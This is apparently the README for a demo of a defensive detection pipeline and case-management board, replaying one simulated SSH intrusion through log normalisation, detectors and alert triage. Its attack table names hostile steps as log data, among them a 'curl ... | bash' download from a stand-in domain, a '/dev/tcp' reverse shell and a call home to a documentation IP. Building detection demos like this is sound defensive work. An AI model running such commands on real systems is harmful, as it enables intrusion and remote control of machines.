# Demo

One simulated intrusion, pushed through every stage of the pipeline.

## Run it

With Docker:

```bash
docker compose -f demo/docker-compose.yml up --build
```

Without Docker (Go, Python 3.10+ with PyYAML, Node.js 22+; Rust optional):

```bash
./demo/run-local.sh
```

Then open <http://localhost:3000>.

`make demo` and `make demo-local` do the same from the repository root.
Reset the Docker demo with `make demo-down`, which also deletes the database
volume. Running the pipeline twice loads the alerts twice.

## What happens

`run_pipeline.py` runs these steps and prints a summary of each:

1. **eventgen** writes 37 raw log lines: background noise plus the attack below.
2. **logpipe** normalises them into events.
3. **sigma-lite**, **auth-anom** and **ioc-feed** each read the events and write alerts.
4. The alerts are posted to **caseboard**.
5. One example case is opened for `prod-server` with its high and critical alerts, a note, and (local run only) an **ir-triage** report as evidence.

## The simulated attack

| Step | Raw data | Detected by |
|------|----------|-------------|
| SSH guessing from `203.0.113.99`, a scanner listed in the sample threat feed | 8 sshd failures for 8 accounts on `bastion-host` | `auth-001`, password spray, IOC match |
| Brute force against `root` on `prod-server` | 10 sshd failures from `192.168.1.66` | `auth-001`, brute force |
| The brute force succeeds | sshd accepts `root` | `auth-002` |
| `alice` logs in from two countries within an hour | 2 sshd logins | impossible travel |
| Root shell through sudo | sudo log line | `privesc-001` |
| Stage-one download | `curl ... \| bash` from `evil-login.example.net` | `exec-001`, IOC match (domain) |
| Implant started from `/tmp` | process start | `exec-003` |
| Implant calls home | TCP connect to `198.51.100.42:4444` | `net-001`, IOC match (IP) |
| Reverse shell | `bash -i >& /dev/tcp/...` | `exec-002` |
| Persistence | `useradd` | `persist-001` |

All addresses are from the RFC 5737 documentation ranges, apart from the two
placeholder addresses the impossible-travel demo map uses. Nothing is sent
anywhere, and no real system is touched.

## What to look at in caseboard

- **Alerts Inbox**: most severe first. Click a title to see the summary and the full alert, including ATT&CK tags and the evidence each detector attached.
- **Untriaged only**: hides alerts that already belong to a case.
- **Cases**: open "Suspected compromise of prod-server" to see linked alerts, the timeline, and the evidence reference. Change the status, add a note, export the case as JSON.
- Select a few of the `bastion-host` alerts, type a title and create a second case yourself.

## Files

| File | Purpose |
|------|---------|
| `docker-compose.yml` | caseboard service plus a one-shot pipeline container |
| `Dockerfile.pipeline` | image with logpipe, the three detectors and eventgen |
| `run_pipeline.py` | drives the pipeline and talks to the caseboard API |
| `run-local.sh` | builds everything and runs the demo without Docker |
| `output/` | raw logs, events, alerts and the database from a local run (not committed) |
